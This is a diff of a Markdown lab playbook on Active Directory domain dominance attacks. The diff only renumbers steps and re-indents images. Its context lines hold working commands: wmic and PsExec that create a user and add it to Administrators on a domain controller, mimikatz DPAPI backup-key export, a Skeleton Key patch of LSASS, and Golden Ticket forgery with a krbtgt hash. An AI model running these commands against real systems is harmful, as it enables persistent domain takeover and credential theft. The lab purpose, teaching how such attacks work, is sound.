@@ -62,19 +62,19 @@ Using WMI via the command line, try to create a process locally on the domain co
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
-2. Now with the user created, add the user to the "Administrators" group on the domain controller:
+1. Now with the user created, add the user to the "Administrators" group on the domain controller:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
-   ![Use remote code execution (PsExec), to add the new user to the Admin group on the domain controller](media/playbook-dominance-psexec_addtoadmins.png)
+    ![Use remote code execution (PsExec), to add the new user to the Admin group on the domain controller](media/playbook-dominance-psexec_addtoadmins.png)
 
-3. Go to **Active Directory Users and Computers (ADUC)** on **ContosoDC** and find the **InsertedUser**. 
+1. Go to **Active Directory Users and Computers (ADUC)** on **ContosoDC** and find the **InsertedUser**. 
 
-4. Right click on **Properties** and check membership.
+1. Right click on **Properties** and check membership.
 
-   ![View the properties of "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
+    ![View the properties of "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
 
 Acting as an attacker, you've successfully created a new user in your lab by using WMI. You've also added the new user to the Administrators group by using PsExec. From a persistence perspective, another legitimate, independent credential was created on the domain controller. New credentials give an attacker persistent access to the domain controller in case the previous credential access gained was discovered and removed.
 
@@ -108,9 +108,9 @@ Using **mimikatz**, we'll attempt to export the master key from the domain contr
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
-   ![Use of mimikatz to export the DPAPI backup key from Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
+    ![Use of mimikatz to export the DPAPI backup key from Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. Verify the master key file export occurred. Look in the directory from which you ran mimikatz.exe from to see the created .der, .pfx, .pvk, and .key files. Copy the legacy key from the command prompt.
+1. Verify the master key file export occurred. Look in the directory from which you ran mimikatz.exe from to see the created .der, .pfx, .pvk, and .key files. Copy the legacy key from the command prompt.
 
 As attackers, we now have the key to decrypt any DPAPI-encrypted file/sensitive data from *any* machine in the entire Forest.
 
@@ -156,15 +156,15 @@ Let's use a Skeleton Key to see how this type of attack works:
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
-2. With **mimikatz** now staged on the DC, remotely execute it via PsExec:
+1. With **mimikatz** now staged on the DC, remotely execute it via PsExec:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
-3. You successfully patched the LSASS process on **ContosoDC**.
+1. You successfully patched the LSASS process on **ContosoDC**.
 
-   ![Skeleton Key attack via mimikatz](media/playbook-dominance-skeletonkey.png)
+    ![Skeleton Key attack via mimikatz](media/playbook-dominance-skeletonkey.png)
 
 ### Exploiting the Skeleton Key Patched LSASS
 
@@ -207,25 +207,25 @@ After stealing the “Golden Ticket”, (“krbtgt” account explained [here vi
    whoami /user
    ```
 
-   ![SID for golden ticket user](media/playbook-dominance-golden_whoamisid.png)
+    ![SID for golden ticket user](media/playbook-dominance-golden_whoamisid.png)
 
-2. Identify and copy the Domain SID highlighted in the above screenshot.
+1. Identify and copy the Domain SID highlighted in the above screenshot.
 
-3. Using **mimikatz**, take the copied Domain SID, along with the stolen “krbtgt” user's NTLM hash to generate the TGT. Insert the following text into a cmd.exe as JeffL:
+1. Using **mimikatz**, take the copied Domain SID, along with the stolen “krbtgt” user's NTLM hash to generate the TGT. Insert the following text into a cmd.exe as JeffL:
 
    ``` cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
-   ![Generate the Golden Ticket](media/playbook-dominance-golden_generate.png)
+    ![Generate the Golden Ticket](media/playbook-dominance-golden_generate.png)
 
    The ```/ptt``` part of the command allowed us to immediately pass the generated ticket into memory.
 
-4. Let's make sure the credential is in memory.  Execute ```klist``` in the console.
+1. Let's make sure the credential is in memory.  Execute ```klist``` in the console.
 
-   ![klist results after passing the generated ticket](media/playbook-dominance-golden_klist.png)
+    ![klist results after passing the generated ticket](media/playbook-dominance-golden_klist.png)
 
-5. Acting as an attacker, execute the following Pass-the-Ticket command to use it against the DC:
+1. Acting as an attacker, execute the following Pass-the-Ticket command to use it against the DC:
 
    ``` cmd
    dir \\ContosoDC\c$
@@ -233,7 +233,7 @@ After stealing the “Golden Ticket”, (“krbtgt” account explained [here vi
 
    Success! You generated a **fake** Golden Ticket for SamiraA.
 
-   ![Execute Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
+    ![Execute Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
 
 Why did it work? The Golden Ticket Attack works because the ticket generated was properly signed with the 'KRBTGT' key we harvested earlier. This ticket allows us, as the attacker, to gain access to ContosoDC and add ourselves to any Security Group that we wish to use.
 
